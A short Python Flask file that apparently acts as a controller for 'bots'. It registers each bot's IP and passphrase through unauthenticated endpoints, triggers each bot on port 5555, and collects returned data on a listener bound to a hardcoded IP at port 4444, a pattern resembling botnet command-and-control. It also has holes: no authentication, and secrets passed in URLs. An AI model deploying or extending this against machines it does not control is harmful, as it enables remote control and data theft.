# /usr/share/python3 

from flask import Flask, request
import socket
import json
import gzip

app = Flask(__name__)

bot_dict = {}

system_ip = '139.59.69.139'

def listner(system_ip, system_port):
    listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        
    listner.bind((system_ip, system_port))                                     
    listner.listen(0)                                                    
    connection, address = listner.accept()                        
    recieved_data = connection.recv(1024 * 1000)
    return recieved_data.decode('utf-8')

def trigger(bot_ip, bot_passphrase):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((bot_ip, 5555))
    sock.sendall(bytes(f"{bot_passphrase}",encoding="utf-8"))

@app.route('/')
def test():
    data_package = []
    bot_names = bot_dict.keys()
    for bot in bot_names:
        bot_ip = bot_dict[bot][0]
        bot_passphrase = bot_dict[bot][1]
        print(bot_ip)
        print(bot_passphrase)
        try:
            trigger(bot_ip, bot_passphrase)
            print("[*] Bot has been triggered")
            data = listner(system_ip, 4444)
            print("Data fetched from the bot: ")
            print(data)
        except:
            data = json.dumps([bot + ' failed to fetch data'])
            pass
        data_package.append(json.loads(data))
        print("Total data recieved: ")
        print(data_package)
    return data_package

@app.route('/bot_register')
def register_bot():
    bot_name = request.args.get('bot_name')
    bot_ip = request.args.get('bot_ip')
    bot_passphrase = request.args.get('bot_passphrase')
    bot_dict[bot_name] = [bot_ip, bot_passphrase]
    return "200 OK"
    
@app.route('/bot_list')
def bot_list():
    return bot_dict

@app.route('/bot_disconnect')
def bot_disconnect():
    bot_name = request.args.get('bot_name')
    del bot_dict[bot_name]
    return "200 OK"